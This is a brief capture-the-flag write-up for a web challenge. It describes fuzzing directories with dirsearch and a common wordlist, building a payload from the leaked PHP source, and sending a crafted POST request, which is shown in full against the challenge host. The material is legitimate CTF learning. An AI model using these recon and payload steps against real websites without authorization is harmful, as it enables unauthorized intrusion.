1. Fuzz the website with /usr/share/wordlists/dirb/common.txt with php extension:
	```python3 dirsearch.py -u URL -w /usr/share/wordlists/dirb/common.txt -e php```

2. After you get the source code, build your payload to get pass all of the conditions. 
   I've personally made a php script that generates the payload for me (get_payload.php)

3. Make a request with the generated payload, example:

```
POST /index.php HTTP/1.1
Host: challenge.ctf.games:31965
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenge.ctf.games:31965/
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Connection: close
Upgrade-Insecure-Requests: 1

name=ntj&answer=qweqweasda&time=1004681409
```
